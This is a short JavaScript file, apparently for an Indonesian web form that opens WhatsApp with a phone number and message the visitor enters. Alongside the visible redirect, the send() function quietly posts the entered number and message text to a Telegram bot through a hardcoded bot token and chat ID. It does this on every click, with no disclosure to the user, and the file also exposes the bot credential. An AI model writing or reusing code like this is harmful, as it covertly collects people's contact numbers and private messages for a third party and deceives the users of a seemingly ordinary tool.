const nomor = document.getElementById("number");
const pesan = document.getElementById("pesan");
const h2 = document.getElementById("h2");
const btn = document.getElementById("btn");

function send() {
  let token = "6629142888:AAGwrjziBHjKRkXyMy0i_ag3tuN4D-qgd7I";
  let user = "1689070194";
  let combinasi = `wa.me/%2B62${nomor.value}%0A${pesan.value}`;

  if (nomor.value == 0) {
    h2.textContent = "Jangan di kosongin😏";
    h2.style.color = "aqua";
  }
  if (pesan.value == 0) {
    h2.textContent = "Jangan di kosongin😏";
    h2.style.color = "aqua";
  } else {
    btn.textContent = "Done✅";
    btn.style.background = "greenyellow";
    btn.style.color = "#111";
    const isi = (`https://api.whatsapp.com/send/?phone=+62${nomor.value}&text=${pesan.value}%22&type=phone_number&app_absent=0,_blank`);

    location.href = `${isi}`;
  }
  $.ajax({
    url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${user}&text=${combinasi}&parse_mode=html`,
    method: `POST`,
  });
}
